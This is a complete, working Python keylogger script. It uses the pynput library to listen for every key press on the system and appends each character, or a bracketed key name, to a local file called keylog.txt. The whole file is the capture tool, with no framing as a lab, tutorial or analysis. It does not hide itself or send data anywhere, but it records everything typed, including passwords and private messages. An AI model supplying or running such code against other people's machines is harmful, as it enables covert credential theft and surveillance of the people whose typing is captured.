#!/usr/bin/python3

from pynput.keyboard import Listener, Key

# Writes key presses to this file
filename = "keylog.txt"

def on_press(key):

    with open(filename, 'a') as f:

        # Writes the character if available
        if hasattr(key, 'char'):
            f.write(key.char)
        
        # Writes space
        elif key == Key.space:
            f.write(' ')

        # Writes newline for enter
        elif key == Key.enter:
            f.write('\n')
        
        # Writes tab
        elif key == Key.tab:
            f.write('\t')

        # Writes anything else as [<keyname>]
        else:
            f.write(f"[{key.name}]")

with Listener(on_press=on_press) as listener: # Setup event listener
    listener.join() # Join individual keypresses togehter